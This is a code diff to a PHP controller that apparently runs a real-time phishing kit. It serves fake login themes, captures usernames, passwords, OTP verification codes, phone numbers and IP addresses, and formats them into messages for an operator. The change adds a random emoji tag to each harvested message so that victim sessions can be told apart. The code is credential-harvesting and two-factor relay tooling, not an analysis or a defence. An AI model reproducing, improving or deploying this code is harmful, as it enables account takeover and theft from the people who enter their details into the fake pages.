@@ -19,7 +19,8 @@ class RealtimeWeb extends Controller
         $web_info = Crypt::encryptString(Json::encode([
             'id' => $db_data->id,
             'userid' => $db_data->userid,
-            'webid' => $db_data->id
+            'webid' => $db_data->id,
+            'emoji' => randomEmojiUnique(5),
         ]));
         // set theme language
         $theme_language = $web_data->theme_language;
@@ -32,7 +33,13 @@ class RealtimeWeb extends Controller
         } else {
             // nếu giao diện 1 phần
             if ($web_data->theme_type == 1) {
-                return view('login.realtime.' . $web_data->loginThemeFolder, ['data' => $web_data, 'info' => $web_info, 'setting' => $user_settings, 'pusher_code' => $pusher_code, 'type' => 'realtime']);
+                return view('login.realtime.' . $web_data->loginThemeFolder, [
+                    'data' => $web_data,
+                    'info' => $web_info,
+                    'setting' => $user_settings,
+                    'pusher_code' => $pusher_code,
+                    'type' => 'realtime'
+                ]);
             }
             // xử lí giao diện 2 phần
             if (!$rq->exists('l')) {
@@ -46,7 +53,13 @@ class RealtimeWeb extends Controller
                         $web_data->redirect_link = '?a&success';
                     }
                 }
-                return view('login.realtime.' . $web_data->loginThemeFolder, ['data' => $web_data, 'info' => $web_info, 'setting' => $user_settings, 'pusher_code' => $pusher_code, 'type' => 'realtime']);
+                return view('login.realtime.' . $web_data->loginThemeFolder, [
+                    'data' => $web_data,
+                    'info' => $web_info,
+                    'setting' => $user_settings,
+                    'pusher_code' => $pusher_code,
+                    'type' => 'realtime'
+                ]);
             }
         }
     }
@@ -56,11 +69,10 @@ class RealtimeWeb extends Controller
             try {
                 /*
                 $post_data chứa array có item là username, password, info, otp(nếu có), action: ac (n: new account/o: otp)
-                + info chứa array có item là id, userid, webid
                 */
                 $post_data = Json::decode($rq->d);
                 /*
-                $web_info chứa array có item là id, userid, webid
+                $web_info chứa array có item là id, userid, webid, emoji (5 emoji random)
                 */
                 $web_info = Json::decode(Crypt::decryptString($post_data->info));
                 $ip = getRealIp();
@@ -109,6 +121,7 @@ class RealtimeWeb extends Controller
                                     "User: <code>$post_data->username</code>",
                                     "Pass: <code>$post_data->password</code>",
                                     "---------------",
+                                    "Emoji phân biệt: $web_info->emoji",
                                     "IP: $ip",
                                     "---------------"
                                 ]);
@@ -139,6 +152,7 @@ class RealtimeWeb extends Controller
                                     "",
                                     "Mã xác minh: <code>$post_data->otp</code>",
                                     "---------------",
+                                    "Emoji phân biệt: $web_info->emoji",
                                     "IP: $ip",
                                     "---------------"
                                 ]);
@@ -206,6 +220,7 @@ class RealtimeWeb extends Controller
                                     "",
                                     "Số điện thoại: <code>$post_data->phone</code>",
                                     "---------------",
+                                    "Emoji phân biệt: $web_info->emoji",
                                     "IP: $ip",
                                     "---------------"
                                 ]);
@@ -236,6 +251,7 @@ class RealtimeWeb extends Controller
                                     "Số điện thoại: <code>$post_data->phone</code>",
                                     "Mã xác minh: <code>$post_data->otp</code>",
                                     "---------------",
+                                    "Emoji phân biệt: $web_info->emoji",
                                     "IP: $ip",
                                     "---------------"
                                 ]);
